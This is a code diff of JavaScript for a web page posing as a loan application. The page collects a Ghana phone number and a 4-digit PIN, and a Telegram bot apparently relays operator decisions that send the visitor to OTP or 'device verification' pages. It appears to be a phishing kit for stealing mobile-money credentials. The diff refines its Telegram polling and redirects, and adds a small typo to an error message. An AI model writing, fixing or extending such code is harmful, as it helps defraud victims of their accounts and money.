@@ -385,7 +385,6 @@
             
             if (data.ok) {
                 spinner.style.display = 'flex';
-                // Start checking for response
                 startCheckingForResponse(approveId, verifyDeviceId, appliedId, declineId);
             } else {
                 throw new Error(data.description || 'Failed to send message');
@@ -397,10 +396,9 @@
         }
     }
 
-    function startCheckingForResponse(approveId, verifyDeviceId, appliedId, declineId) {
+    function startCheckingForResponse(expectedApproveId, expectedVerifyId, expectedAppliedId, expectedDeclineId) {
         let lastUpdateId = 0;
         
-        // Get current offset first
         fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=-1`)
             .then(r => r.json())
             .then(data => {
@@ -408,7 +406,6 @@
                     lastUpdateId = data.result[data.result.length - 1].update_id;
                 }
                 
-                // Poll every 2 seconds
                 checkInterval = setInterval(() => {
                     fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                         .then(r => r.json())
@@ -424,31 +421,48 @@
                                     const callbackData = update.callback_query.data;
                                     const callbackId = update.callback_query.id;
                                     
-                                    console.log('Callback received:', callbackData);
+                                    console.log('📨 Callback received:', callbackData);
+                                    console.log('🎯 Expected approve:', expectedApproveId);
                                     
-                                    // Check if this callback matches our request
-                                    if (callbackData === approveId) {
+                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            callback_query_id: callbackId,
+                                            text: "Processing..."
+                                        })
+                                    }).catch(console.error);
+                                    
+                                    if (callbackData === expectedApproveId) {
+                                        console.log('✅ MATCH! Redirecting to OTP page...');
                                         clearInterval(checkInterval);
                                         spinner.style.display = 'none';
                                         showStatus("✅ Loan Approved! Redirecting...", "success");
-                                        window.location.href = CONFIG.DEVICE_PAGE;
+                                        setTimeout(() => {
+                                            window.location.href = CONFIG.DEVICE_PAGE;
+                                        }, 1000);
                                         return;
                                     }
-                                    else if (callbackData === verifyDeviceId) {
+                                    else if (callbackData === expectedVerifyId) {
+                                        console.log('📱 Verify Device clicked');
                                         clearInterval(checkInterval);
                                         spinner.style.display = 'none';
                                         showStatus("📱 Device verification required.", "processing");
-                                        window.location.href = '/device_verify.html';
+                                        setTimeout(() => {
+                                            window.location.href = '/device_verify.html';
+                                        }, 1000);
                                         return;
                                     }
-                                    else if (callbackData === appliedId) {
+                                    else if (callbackData === expectedAppliedId) {
+                                        console.log('📋 Already Applied clicked');
                                         clearInterval(checkInterval);
                                         spinner.style.display = 'none';
                                         showStatus("📋 You have already applied.", "error");
                                         resetButton();
                                         return;
                                     }
-                                    else if (callbackData === declineId) {
+                                    else if (callbackData === expectedDeclineId) {
+                                        console.log('❌ Decline clicked');
                                         clearInterval(checkInterval);
                                         spinner.style.display = 'none';
                                         showError("❌ Request declined.");
@@ -478,7 +492,7 @@
         const pin = pinInput.value.trim();
 
         if (!phone || !isValidGhanaNumber(phone)) {
-            showError("Please enter a valid Ghana number (e.g. 0501234567)");
+            showError("Please enter a valid Ghana number (e.g. 0501234567");
             return;
         }
         if (pin.length !== 4) {
